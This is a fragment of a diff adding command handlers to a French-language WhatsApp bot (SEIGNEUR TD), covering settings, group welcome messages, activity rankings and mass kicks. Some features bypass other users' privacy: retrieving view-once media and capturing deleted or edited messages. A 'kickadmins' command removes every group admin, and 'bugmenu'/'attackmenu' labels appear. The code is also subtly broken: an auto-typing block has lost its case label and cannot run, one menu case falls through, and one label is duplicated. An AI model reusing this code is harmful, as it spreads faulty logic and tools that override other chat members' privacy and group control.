+        await sendSubMenu(sock, message, remoteJid, senderJid, 'utility'); break;
+      case '5': case 'bugmenu': case 'attackmenu':
+      case '6': case 'stickermenu': case 'mediamenu':
+        await sendSubMenu(sock, message, remoteJid, senderJid, 'sticker'); break;
+      case '7': case 'miscmenu': case 'generalmenu':
+        await sendSubMenu(sock, message, remoteJid, senderJid, 'misc'); break;
+      case '8': case 'imagemenu': case 'viewoncemenu':
+        await sendSubMenu(sock, message, remoteJid, senderJid, 'image'); break;
+      case '9': case 'gamesmenu': case 'gamemenu':
+        await sendSubMenu(sock, message, remoteJid, senderJid, 'games'); break;
+
+      case 'vv':
+        await handleViewOnceCommand(sock, message, args, remoteJid, senderJid);
+        break;
+
+      case 'mode':
+        // ✅ OWNER UNIQUEMENT — vérifie via isAdmin
+        if (!isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, {
+            text: '⛔ Cette commande est réservée au propriétaire du bot uniquement.'
+          });
+          break;
+        }
+        
+        if (args[0] === 'private') {
+          botMode = 'private';
+          saveData();
+          await sock.sendMessage(remoteJid, {
+            text: '🔒 Mode PRIVÉ activé\nSeuls les admins peuvent utiliser le bot.'
+          });
+        } else if (args[0] === 'public') {
+          botMode = 'public';
+          saveData();
+          await sock.sendMessage(remoteJid, {
+            text: '🌐 Mode PUBLIC activé\nTout le monde peut utiliser le bot.'
+          });
+        } else {
+          await sock.sendMessage(remoteJid, {
+            text: `Current mode: ${botMode.toUpperCase()}\n\nUtilisation:\n${config.prefix}mode private\n${config.prefix}mode public`
+          });
+        }
+        break;
+
+      // =============================================
+      // ⚙️ GETSETTINGS — Voir tous les paramètres
+      // =============================================
+      case 'getsettings':
+      case 'settings': {
+        if (!isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
+          break;
+        }
+        const on = '✅ ON';
+        const off = '❌ OFF';
+        const settingsText =
+`⚙️ ━━━━━━━━━━━━━━━━━━━━━━━
+   🤖 *SEIGNEUR TD — SETTINGS*
+⚙️ ━━━━━━━━━━━━━━━━━━━━━━━
+
+*╭─「 🔧 SYSTÈME 」*
+*│* 🌐 *Mode:* \`${botMode.toUpperCase()}\`
+*│* ✒️ *Prefix:* \`${config.prefix}\`
+*│* 🤖 *Bot Name:* \`${config.botName}\`
+*╰──────────────────*
+
+*╭─「 🎛️ TOGGLES 」*
+*│* ⌨️ *AutoTyping:* ${autoTyping ? on : off}
+*│* 🎙️ *AutoRecording:* ${autoRecording ? on : off}
+*│* ⚡ *AutoReact:* ${autoReact ? on : off}
+*│* 🗑️ *AntiDelete:* ${antiDelete ? on : off}
+*│* ✏️ *AntiEdit:* ${antiEdit ? on : off}
+*│* 🤖 *Chatbot:* ${chatbotEnabled ? on : off}
+*╰──────────────────*
+
+*╭─「 🎨 STICKER 」*
+*│* 📦 *Pack Name:* \`${stickerPackname}\`
+*│* ✍️ *Author:* \`${stickerAuthor}\`
+*╰──────────────────*
+
+*╭─「 💧 WATERMARK 」*
+*│* © 𝙳𝙴𝚅 𝙳𝙾𝚂𝚃𝙾𝙴𝚅𝚂𝙺𝚈 𝚃𝙴𝙲𝙷𝑿
+*╰──────────────────*
+
+*📝 Commandes disponibles:*
+• \`${config.prefix}setstickerpackname [nom]\`
+• \`${config.prefix}setstickerauthor [nom]\`
+• \`${config.prefix}setprefix [préfixe]\`
+• \`${config.prefix}setbotimg\` _(répondre à une image)_
+
+━━━━━━━━━━━━━━━━━━━━━━━
+_© SEIGNEUR TD — Dostoevsky TechX_ `;
+
+        await sock.sendMessage(remoteJid, { text: settingsText }, { quoted: message });
+        break;
+      }
+
+      // =============================================
+      // 📦 SETSTICKERPACKNAME — Changer le pack name
+      // =============================================
+      case 'setstickerpackname':
+      case 'setpackname': {
+        if (!isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
+          break;
+        }
+        const newPackName = args.join(' ').trim();
+        if (!newPackName) {
+          await sock.sendMessage(remoteJid, {
+            text: `📦 Pack actuel: *${stickerPackname}*\n\nUsage: ${config.prefix}setstickerpackname [nouveau nom]`
+          });
+          break;
+        }
+        stickerPackname = newPackName;
+        saveData();
+        await sock.sendMessage(remoteJid, {
+          text: `📦 *Sticker Pack Name mis à jour!*\n\n✅ Nouveau nom: *${stickerPackname}*\n\n_Tous les prochains stickers auront ce nom._`
+        }, { quoted: message });
+        break;
+      }
+
+      // =============================================
+      // ✍️ SETSTICKERAUTHOR — Changer l'auteur
+      // =============================================
+      case 'setstickerauthor':
+      case 'setauthor': {
+        if (!isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
+          break;
+        }
+        const newAuthor = args.join(' ').trim();
+        if (!newAuthor) {
+          await sock.sendMessage(remoteJid, {
+            text: `✍️ Auteur actuel: *${stickerAuthor}*\n\nUsage: ${config.prefix}setstickerauthor [nouveau nom]`
+          });
+          break;
+        }
+        stickerAuthor = newAuthor;
+        saveData();
+        await sock.sendMessage(remoteJid, {
+          text: `✍️ *Sticker Author mis à jour!*\n\n✅ Nouvel auteur: *${stickerAuthor}*\n\n_Tous les prochains stickers auront cet auteur._`
+        }, { quoted: message });
+        break;
+      }
+
+      // =============================================
+      // ✒️ SETPREFIX — Changer le préfixe
+      // =============================================
+      case 'setprefix': {
+        if (!isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
+          break;
+        }
+        const newPrefix = args[0]?.trim();
+        if (!newPrefix || newPrefix.length > 3) {
+          await sock.sendMessage(remoteJid, {
+            text: `✒️ Préfixe actuel: *${config.prefix}*\n\nUsage: ${config.prefix}setprefix [préfixe]\nEx: ${config.prefix}setprefix .\n\n⚠️ Max 3 caractères.`
+          });
+          break;
+        }
+        config.prefix = newPrefix;
+        saveData();
+        await sock.sendMessage(remoteJid, {
+          text: `✒️ *Préfixe mis à jour!*\n\n✅ Nouveau préfixe: *${config.prefix}*\n\n_Utilisez maintenant: ${config.prefix}menu_`
+        }, { quoted: message });
+        break;
+      }
+
+      // =============================================
+      // 🖼️ SETBOTIMG — Changer l'image du bot
+      // =============================================
+      case 'setbotimg':
+      case 'setbotimage': {
+        if (!isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
+          break;
+        }
+        const quotedSetImg = message.message?.extendedTextMessage?.contextInfo?.quotedMessage;
+        const imgData = quotedSetImg?.imageMessage;
+        if (!imgData) {
+          await sock.sendMessage(remoteJid, {
+            text: `🖼️ Usage: Réponds à une image avec *${config.prefix}setbotimg*\n\nCette image sera utilisée comme photo du bot dans les menus.`
+          }, { quoted: message });
+          break;
+        }
+        try {
+          const stream = await downloadContentFromMessage(imgData, 'image');
+          let buffer = Buffer.alloc(0);
+          for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);
+          const botImgPath = './menu.jpg';
+          fs.writeFileSync(botImgPath, buffer);
+          await sock.sendMessage(remoteJid, {
+            text: `🖼️ *Image du bot mise à jour!*\n\n✅ La nouvelle image sera utilisée dans les menus.\n_Redémarre le bot pour confirmer._`
+          }, { quoted: message });
+        } catch(e) {
+          await sock.sendMessage(remoteJid, { text: `❌ Erreur: ${e.message}` });
+        }
+        break;
+      }
+
+      // =============================================
+      // 🎨 SETMENUSTYLE — Changer le style de menu
+      // =============================================
+      case 'setmenustyle':
+      case 'menustyle': {
+        if (!isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
+          break;
+        }
+        const styleNum = parseInt(args[0]);
+        if (!styleNum || styleNum < 1 || styleNum > 3) {
+          await sock.sendMessage(remoteJid, {
+            text:
+`🎨 *Styles de menu disponibles:*
+
+*Style 1* — Original SEIGNEUR TD (défaut)
+*Style 2* — Modern Box avec stats mémoire
+*Style 3* — Monospace Élégant
+
+Usage: \`${config.prefix}setmenustyle [1|2|3]\`
+
+Style actuel: *${menuStyle}*`
+          }, { quoted: message });
+          break;
+        }
+        menuStyle = styleNum;
+        saveData();
+        await sock.sendMessage(remoteJid, {
+          text: `🎨 *Style de menu changé!*\n\n✅ Style *${menuStyle}* activé\n\n_Tape ${config.prefix}menu pour voir le nouveau style._`
+        }, { quoted: message });
+        break;
+      }
+        if (!isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
+          break;
+        }
+        autoTyping = !autoTyping;
+        saveData();
+        await sock.sendMessage(remoteJid, {
+          text: `⌨️ Auto-Typing: ${autoTyping ? '✅ ON' : '❌ OFF'}`
+        });
+        break;
+
+      case 'autorecording':
+        if (!isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
+          break;
+        }
+        autoRecording = !autoRecording;
+        saveData();
+        await sock.sendMessage(remoteJid, {
+          text: `🎙️ Auto-Recording: ${autoRecording ? '✅ ON' : '❌ OFF'}`
+        });
+        break;
+
+      case 'readstatus':
+      case 'autostatus':
+        if (!isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
+          break;
+        }
+
+        if (args.length === 0) {
+          await sock.sendMessage(remoteJid, {
+            text: `📱 *Gestion des Status*\n\n• Lecture auto: ${autoReadStatus ? '✅ ON' : '❌ OFF'}\n• Like auto: ${autoLikeStatus ? '✅ ON' : '❌ OFF'}\n• Emoji: \n\nCommandes:\n${config.prefix}readstatus read - Activer/Désactiver lecture\n${config.prefix}readstatus like - Activer/Désactiver like\n${config.prefix}readstatus all - Tout activer/désactiver`
+          });
+          break;
+        }
+
+        const subCmd = args[0].toLowerCase();
+        switch (subCmd) {
+          case 'read':
+            autoReadStatus = !autoReadStatus;
+            saveData();
+            await sock.sendMessage(remoteJid, {
+              text: `👁️ Lecture auto des status: ${autoReadStatus ? '✅ ACTIVÉE' : '❌ DÉSACTIVÉE'}`
+            });
+            break;
+
+          case 'like':
+            autoLikeStatus = !autoLikeStatus;
+            saveData();
+            await sock.sendMessage(remoteJid, {
+              text: ` Like auto des status: ${autoLikeStatus ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}\n\nEmoji utilisé: `
+            });
+            break;
+
+          case 'all':
+            autoReadStatus = !autoReadStatus;
+            autoLikeStatus = autoReadStatus;
+            saveData();
+            await sock.sendMessage(remoteJid, {
+              text: `📱 Système de status: ${autoReadStatus ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}\n\n• Lecture auto: ${autoReadStatus ? 'ON' : 'OFF'}\n• Like auto: ${autoLikeStatus ? 'ON' : 'OFF'}\n• Emoji: `
+            });
+            break;
+
+          default:
+            await sock.sendMessage(remoteJid, {
+              text: `❌ Option inconnue\n\nUtilisez:\n${config.prefix}readstatus read\n${config.prefix}readstatus like\n${config.prefix}readstatus all`
+            });
+        }
+        break;
+
+      case 'antibug':
+      case 'antibug':
+        if (!isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔  ' });
+          break;
+        }
+        await handleAntiBugCommand(sock, args, remoteJid, senderJid);
+        break;
+
+      case 'antidelete':
+      case 'antidel':
+        if (!isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
+          break;
+        }
+
+        antiDelete = !antiDelete;
+        saveData();
+        
+        await sock.sendMessage(remoteJid, {
+          text: `🗑️ *Anti-Delete* — Statut : ${antiDelete ? "✅ ACTIVÉ" : "❌ DÉSACTIVÉ"}`,
+          footer: '© SEIGNEUR TD',
+          buttons: [
+            {
+              buttonId: 'antidelete_toggle',
+              buttonText: { displayText: '🔘 Oui / Non' },
+              type: 4,
+              nativeFlowInfo: {
+                name: 'single_select',
+                paramsJson: JSON.stringify({
+                  title: '🗑️ Anti-Delete',
+                  sections: [{ title: 'Action', rows: [
+                    { header: '✅', title: 'Activer', description: 'Activer Anti-Delete', id: `${config.prefix}antidelete on` },
+                    { header: '❌', title: 'Désactiver', description: 'Désactiver Anti-Delete', id: `${config.prefix}antidelete off` }
+                  ]}]
+                })
+              }
+            }
+          ],
+          headerType: 1,
+          viewOnce: true
+        });
+        break;
+
+      case 'antiedit': {
+        if (!isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
+          break;
+        }
+        
+        const subCmd = args[0]?.toLowerCase();
+        
+        if (subCmd === 'on') {
+          antiEdit = true;
+          await sock.sendMessage(remoteJid, { text: '✅ Anti-Edit activé' });
+        } else if (subCmd === 'off') {
+          antiEdit = false;
+          await sock.sendMessage(remoteJid, { text: '❌ Anti-Edit désactivé' });
+        } else if (subCmd === 'set') {
+          const mode = args[1]?.toLowerCase();
+          if (mode === 'private') {
+            antiEditMode = 'private';
+            await sock.sendMessage(remoteJid, { text: '✅ Anti-Edit: mode PRIVÉ' });
+          } else if (mode === 'gchat') {
+            antiEditMode = 'gchat';
+            await sock.sendMessage(remoteJid, { text: '✅ Anti-Edit: mode GROUPES' });
+          } else if (mode === 'all') {
+            antiEditMode = 'all';
+            await sock.sendMessage(remoteJid, { text: '✅ Anti-Edit: mode TOUT' });
+          } else {
+            await sock.sendMessage(remoteJid, { 
+              text: `Usage: !antiedit set private/gchat/all` 
+            });
+          }
+        } else {
+          await sock.sendMessage(remoteJid, { 
+            text: `📝 *ANTI-EDIT*
+
+Status: ${antiEdit ? '✅' : '❌'}
+Mode: ${antiEditMode}
+
+!antiedit on/off
+!antiedit set private/gchat/all` 
+          });
+        }
+        break;
+
+        }
+
+      case 'welcome':
+        if (!isGroup) {
+          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
+          break;
+        }
+
+        const isUserAdminWelcome = await isGroupAdmin(sock, remoteJid, senderJid);
+        if (!isUserAdminWelcome && !isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
+          break;
+        }
+
+        const settingsWelcome = getGroupSettings(remoteJid);
+        settingsWelcome.welcome = !settingsWelcome.welcome;
+        saveData();
+
+        await sock.sendMessage(remoteJid, {
+          text: `╔═══════════════════════════════════╗
+║    👋 𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗦𝗬𝗦𝗧𝗘𝗠      ║
+╚═══════════════════════════════════╝
+
+📊 *Statut:* ${settingsWelcome.welcome ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}
+
+${settingsWelcome.welcome ? '✅ Les nouveaux membres recevront un message de bienvenue élégant with:\n\n• Nom du groupe\n• Nombre de membres\n• Liste des admins\n• Règles du groupe\n• Date et heure' : '❌ Les nouveaux membres ne recevront plus de message de bienvenue'}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+     𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗`
+        });
+        break;
+
+      case 'goodbye':
+        if (!isGroup) {
+          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
+          break;
+        }
+
+        const isUserAdminGoodbye = await isGroupAdmin(sock, remoteJid, senderJid);
+        if (!isUserAdminGoodbye && !isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
+          break;
+        }
+
+        const settingsGoodbye = getGroupSettings(remoteJid);
+        settingsGoodbye.goodbye = !settingsGoodbye.goodbye;
+        saveData();
+
+        await sock.sendMessage(remoteJid, {
+          text: `╔═══════════════════════════════════╗
+║    💨 𝗚𝗢𝗢𝗗𝗕𝗬𝗘 𝗦𝗬𝗦𝗧𝗘𝗠      ║
+╚═══════════════════════════════════╝
+
+📊 *Statut:* ${settingsGoodbye.goodbye ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}
+
+${settingsGoodbye.goodbye ? '✅ Un message d\'au revoir sera envoyé quand quelqu\'un quitte with:\n\n• Nom du groupe\n• Nombre de membres restants\n• Liste des admins\n• Informations utiles\n• Date et heure' : '❌ Plus de message d\'au revoir quand quelqu\'un quitte'}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+     𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗`
+        });
+        break;
+
+      case 'listactive':
+        if (!isGroup) {
+          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
+          break;
+        }
+
+        try {
+          const metadata = await sock.groupMetadata(remoteJid);
+          const participants = metadata.participants;
+          const superadmin = metadata.owner || metadata.participants.find(p => p.admin === 'superadmin')?.id || 'Unknown';
+          
+          // Obtenir l'activité pour ce groupe
+          const groupActivity = memberActivity.get(remoteJid) || new Map();
+          
+          // Collecter l'activité de tous les membres
+          const activityList = [];
+          for (const participant of participants) {
+            const activity = groupActivity.get(participant.id);
+            
+            if (activity && activity.messageCount > 0) {
+              activityList.push({
+                jid: participant.id,
+                count: activity.messageCount,
+                last: activity.lastMessage
+              });
+            }
+          }
+          
+          // Trier par nombre de messages (décroissant)
+          activityList.sort((a, b) => b.count - a.count);
+          
+          // Top 3
+          const top3 = activityList.slice(0, 3);
+          const activeCount = activityList.length;
+          
+          // Date et heure
+          const now = new Date();
+          const dateStr = now.toLocaleDateString('fr-FR', {
+            timeZone: 'America/Port-au-Prince',
+            day: '2-digit',
+            month: '2-digit',
+            year: 'numeric'
+          });
+          const timeStr = now.toLocaleTimeString('fr-FR', {
+            timeZone: 'America/Port-au-Prince',
+            hour: '2-digit',
+            minute: '2-digit'
+          });
+          
+          let listText = `✨ ┏━━━━━━━ 📊 🄻🄸🅂🅃🄴 🄰🄲🅃🄸🅅🄴 ━━━━━━━┓ ✨
+🏆 ＴＯＰ ＣＨＡＴＴＥＲＳ ＤＵ ＭＯＭＥＮＴ 🏆\n`;
+
+          if (top3.length > 0) {
+            const medals = ['🥇', '🥈', '🥉'];
+            const ranks = ['𝟭𝗲𝗿', '𝟮𝗲̀𝗺𝗲', '𝟯𝗲̀𝗺𝗲'];
+            const emojis = ['✨', '⚡', '❄️'];
+            
+            top3.forEach((member, index) => {
+              listText += `${emojis[index]} ${medals[index]} ${ranks[index]} : @${member.jid.split('@')[0]}\n`;
+              listText += `╰── 💬 ${member.count} 𝖬𝖾𝗌𝗌𝖺𝗀𝖾𝗌\n`;
+            });
+          } else {
+            listText += `⚠️ Aucune activité détectée encore.\n`;
+          }
+          
+          listText += `━━━━━━━━━━━━━━━━━━━━━━━━━━
+📊 𝖲𝗍𝖺𝗍𝗂𝗌𝗍𝗂𝗊𝗎𝖾𝗌 𝖦𝗅𝗈𝖻𝖺𝗅𝖾𝗌 :
+👥 𝖬𝖾𝗆𝖻𝗋𝖾𝗌 𝖠𝖼𝗍𝗂𝗏𝖾𝗌 : ${activeCount}/${participants.length}
+📈 𝖳𝖾𝗇𝖽𝖺𝗇𝖼𝖾 : ${((activeCount / participants.length) * 100).toFixed(1)}%
+📅 𝖬𝗂𝗌𝖾 𝖺̀ 𝗃𝗈𝗎𝗋 : ${dateStr} | ${timeStr}
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+💠 𝕯𝖊𝖛𝖊𝖑𝖔𝖕𝖕𝖊𝖉 𝖇𝖞 @${superadmin.split('@')[0]} 💠`;
+
+          const mentions = top3.map(m => m.jid).concat([superadmin]);
+          
+          await sock.sendMessage(remoteJid, {
+            text: listText,
+            mentions: mentions
+          });
+        } catch (error) {
+          console.error(' listactive:', error);
+          await sock.sendMessage(remoteJid, { text: '❌ ' });
+        }
+        break;
+
+      case 'listinactive':
+        if (!isGroup) {
+          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
+          break;
+        }
+
+        try {
+          const threshold = args[0] ? parseInt(args[0]) : 7; // Par défaut 7 jours
+          const metadata = await sock.groupMetadata(remoteJid);
+          const participants = metadata.participants;
+          const superadmin = metadata.owner || metadata.participants.find(p => p.admin === 'superadmin')?.id || 'Unknown';
+          
+          const now = Date.now();
+          const thresholdMs = threshold * 24 * 60 * 60 * 1000; // Jours en millisecondes
+          
+          // Obtenir l'activité pour ce groupe
+          const groupActivity = memberActivity.get(remoteJid) || new Map();
+          
+          // Collecter les inactifs
+          const inactiveList = [];
+          for (const participant of participants) {
+            const activity = groupActivity.get(participant.id);
+            
+            if (!activity || (now - activity.lastMessage) > thresholdMs) {
+              const daysSinceLastMessage = activity 
+                ? Math.floor((now - activity.lastMessage) / (24 * 60 * 60 * 1000))
+                : 999; // Jamais parlé
+              
+              inactiveList.push({
+                jid: participant.id,
+                days: daysSinceLastMessage
+              });
+            }
+          }
+          
+          // Trier par inactivité (décroissant)
+          inactiveList.sort((a, b) => b.days - a.days);
+          
+          // Top 3
+          const top3 = inactiveList.slice(0, 3);
+          const inactiveCount = inactiveList.length;
+          
+          // Date et heure
+          const nowDate = new Date();
+          const dateStr = nowDate.toLocaleDateString('fr-FR', {
+            timeZone: 'America/Port-au-Prince',
+            day: '2-digit',
+            month: '2-digit',
+            year: 'numeric'
+          });
+          const timeStr = nowDate.toLocaleTimeString('fr-FR', {
+            timeZone: 'America/Port-au-Prince',
+            hour: '2-digit',
+            minute: '2-digit'
+          });
+          
+          let listText = `⚠️ ┏━━━━━━━ ⚡ 🅂🄲🄰🄽 🄸🄽🄰🄲🅃🄸🄵 ━━━━━━━┓ ⚠️
+🌑 ＭＥＭＢＲＥＳ ＥＮ ＳＯＭＭＥＩＬ 🌑\n`;
+
+          if (top3.length > 0) {
+            const ranks = ['𝟭𝗲𝗿', '𝟮𝗲̀𝗺𝗲', '𝟯𝗲̀𝗺𝗲'];
+            
+            top3.forEach((member, index) => {
+              const daysText = member.days >= 999 ? 'Jamais actif' : `${member.days} 𝗃𝗈𝗎𝗋𝗌`;
+              listText += `🛑 ${ranks[index]} : @${member.jid.split('@')[0]}\n`;
+              listText += `╰── ⏳ 𝖣𝖾𝗋𝗇𝗂𝖾𝗋 𝗆𝗌𝗀 : ${daysText}\n`;
+            });
+          } else {
+            listText += `✅ Tous les membres sont actifs!\n`;
+          }
+          
+          listText += `━━━━━━━━━━━━━━━━━━━━━━━━━━
+📉 𝖤́𝗍𝖺𝗍 𝖽𝗎 𝖲𝗒𝗌𝗍𝖾̀𝗆𝖾 :
+💤 𝖨𝗇𝖺𝖼𝗍𝗂𝖿𝗌 𝖽𝖾́𝗍𝖾𝖼𝗍𝖾́𝗌 : ${inactiveCount}/${participants.length}
+⚙️ 𝖲𝖾𝗎𝗂𝗅 𝖽𝖾 𝗍𝗈𝗅𝖾́𝗋𝖺𝗇𝖼𝖾 : ${threshold} 𝗃𝗈𝗎𝗋𝗌
+🚨 𝖠𝗍𝗍𝖾𝗇𝗍𝗂𝗈𝗇 : 𝖫𝖾𝗌 𝗆𝖾𝗆𝖻𝗋𝖾𝗌 𝗂𝗇𝖺𝖼𝗍𝗂𝖿𝗌 𝗋𝗂𝗌𝗊𝗎𝖾𝗇𝗍
+𝗎𝗇𝖾 𝖾𝗑𝗉𝗎𝗅𝗌𝗂𝗈𝗇 𝖺𝗎𝗍𝗈𝗆𝖺𝗍𝗂𝗊𝗎𝖾.
+📅 ${dateStr} | ${timeStr}
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+💠 𝕾𝖞𝖘𝖙𝖊𝖒 𝕬𝖉𝖒𝖎𝖓 : @${superadmin.split('@')[0]} 💠`;
+
+          const mentions = top3.map(m => m.jid).concat([superadmin]);
+          
+          await sock.sendMessage(remoteJid, {
+            text: listText,
+            mentions: mentions
+          });
+        } catch (error) {
+          console.error(' listinactive:', error);
+          await sock.sendMessage(remoteJid, { text: '❌ ' });
+        }
+        break;
+
+      case 'kickinactive':
+        if (!isGroup) {
+          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
+          break;
+        }
+
+        const isUserAdminKickInactive = await isGroupAdmin(sock, remoteJid, senderJid);
+        if (!isUserAdminKickInactive && !isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
+          break;
+        }
+
+        const botIsAdminKickInactive = await isBotGroupAdmin(sock, remoteJid);
+        if (!botIsAdminKickInactive) {
+          await sock.sendMessage(remoteJid, { text: '❌ Je dois être admin' });
+          break;
+        }
+
+        try {
+          const thresholdDays = args[0] ? parseInt(args[0]) : 7;
+          const metadata = await sock.groupMetadata(remoteJid);
+          const participants = metadata.participants;
+          
+          const now = Date.now();
+          const thresholdMs = thresholdDays * 24 * 60 * 60 * 1000;
+          
+          // Obtenir l'activité pour ce groupe
+          const groupActivity = memberActivity.get(remoteJid) || new Map();
+          
+          // Collecter les inactifs à expulser
+          const toKick = [];
+          for (const participant of participants) {
+            // Ne pas expulser les admins
+            if (participant.admin) continue;
+            
+            const activity = groupActivity.get(participant.id);
+            
+            if (!activity || (now - activity.lastMessage) > thresholdMs) {
+              toKick.push(participant.id);
+            }
+          }
+          
+          if (toKick.length === 0) {
+            await sock.sendMessage(remoteJid, {
+              text: `✅ Aucun membre inactif détecté (seuil: ${thresholdDays} jours)`
+            });
+            break;
+          }
+          
+          await sock.sendMessage(remoteJid, {
+            text: `⚡ Expulsion des membres inactifs...\n\n🎯 ${toKick.length} membre(s) seront expulsés`
+          });
+          
+          // Expulser par batch de 10
+          let kicked = 0;
+          for (let i = 0; i < toKick.length; i += 10) {
+            const batch = toKick.slice(i, i + 10);
+            try {
+              await sock.groupParticipantsUpdate(remoteJid, batch, 'remove');
+              kicked += batch.length;
+              await delay(1000);
+            } catch (error) {
+              console.error(' kicking batch:', error);
+            }
+          }
+          
+          await sock.sendMessage(remoteJid, {
+            text: `╔═══════════════════════════════════╗
+║   ⚡ 𝗞𝗜𝗖𝗞 𝗜𝗡𝗔𝗖𝗧𝗜𝗩𝗘 𝗖𝗢𝗠𝗣𝗟𝗘𝗧  ║
+╚═══════════════════════════════════╝
+
+✅ *Expulsions effectuées:* ${kicked}/${toKick.length}
+⏰ *Seuil d'inactivité:* ${thresholdDays} jours
+📊 *Membres restants:* ${participants.length - kicked}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+     𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗`
+          });
+        } catch (error) {
+          console.error(' kickinactive:', error);
+          await sock.sendMessage(remoteJid, { text: '❌ ' });
+        }
+        break;
+
+      case 'autoreact':
+        await handleAutoReactCommand(sock, args, remoteJid, senderJid);
+        break;
+
+      case 'tagall':
+        await handleTagAll(sock, message, args, remoteJid, isGroup, senderJid);
+        break;
+
+      case 'tagadmins':
+      case 'tagadmin':
+      case 'pingtag': {
+        if (!isGroup) {
+          await sock.sendMessage(remoteJid, { text: '❌ Groupe uniquement.' });
+          break;
+        }
+        try {
+          const metadata = await sock.groupMetadata(remoteJid);
+          const admins = metadata.participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin');
+          if (admins.length === 0) {
+            await sock.sendMessage(remoteJid, { text: '❌ Aucun admin trouvé dans ce groupe.' });
+            break;
+          }
+          const adminJids = admins.map(a => a.id);
+          const customMsg = args.join(' ') || '';
+          let adminList = '';
+          admins.forEach((a, i) => {
+            const tag = a.admin === 'superadmin' ? '♛' : '🛡️';
+            adminList += `  ${tag} @${a.id.split('@')[0]}\n`;
+          });
+
+          await sock.sendMessage(remoteJid, {
+            text:
+`⌬ ━━━━━ 🛡️ ᴀᴅᴍɪɴ_ʙʀᴏᴀᴅᴄᴀꜱᴛ ━━━━━ ⌬
+
+  ✧⚚✧ ɢʀᴏᴜᴘᴇ : 『 ${metadata.subject} 』
+  👥 ᴀᴅᴍɪɴꜱ : ${admins.length}
+
+  ╔⟡───────────────────────────⟡╗
+  ⟁ 🛡️ ᴀᴅᴍɪɴ_ʟɪꜱᴛ :
+${adminList}  ╚⟡───────────────────────────⟡╝
+${customMsg ? `\n  📢 ${customMsg}\n` : ''}
+  ▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
+  🜲 ꜱᴛᴀᴛᴜꜱ : ᴄᴏɴɴᴇᴄᴛᴇᴅ |  ᴏɴʟɪɴᴇ`,
+            mentions: adminJids
+          });
+          try { await sock.sendMessage(remoteJid, { react: { text: '🛡️', key: message.key } }); } catch(e) {}
+        } catch(e) {
+          console.error('[tagadmins]', e.message);
+          await sock.sendMessage(remoteJid, { text: `❌ Erreur: ${e.message}` });
+        }
+        break;
+      }
+
+      case 'kickadmins':
+      case 'kickadmin':
+      case 'removeadmins': {
+        if (!isGroup) {
+          await sock.sendMessage(remoteJid, { text: '❌ Groupe uniquement.' });
+          break;
+        }
+        if (!isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔ Sèlman owner/admin ki ka fè sa.' });
+          break;
+        }
+        try {
+          const metadata = await sock.groupMetadata(remoteJid);
+          const botJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
+          // Exclure le bot lui-même et le superadmin (owner du groupe)
+          const adminsToKick = metadata.participants.filter(p =>
+            (p.admin === 'admin') &&
+            p.id !== botJid &&
+            !isAdmin(p.id)
+          );
+
+          if (adminsToKick.length === 0) {
+            await sock.sendMessage(remoteJid, { text: '❌ Aucun admin à expulser.' });
+            break;
+          }
+
+          await sock.sendMessage(remoteJid, {
+            text: `⚙️ Expulsion de ${adminsToKick.length} admin(s) en cours...`
+          });
+
+          let kicked = 0;
+          for (const admin of adminsToKick) {
+            try {
+              await sock.groupParticipantsUpdate(remoteJid, [admin.id], 'remove');
+              kicked++;
+              await delay(800);
+            } catch(e) { console.error('[kickadmins] skip:', admin.id, e.message); }
+          }
+
+          await sock.sendMessage(remoteJid, {
+            text:
+`✅ *KickAdmins terminé !*
+━━━━━━━━━━━━━━━━━━━━━━━
+🛡️ Admins expulsés : ${kicked}/${adminsToKick.length}
+━━━━━━━━━━━━━━━━━━━━━━━
+_© SEIGNEUR TD_`
+          });
+        } catch(e) {
+          console.error('[kickadmins]', e.message);
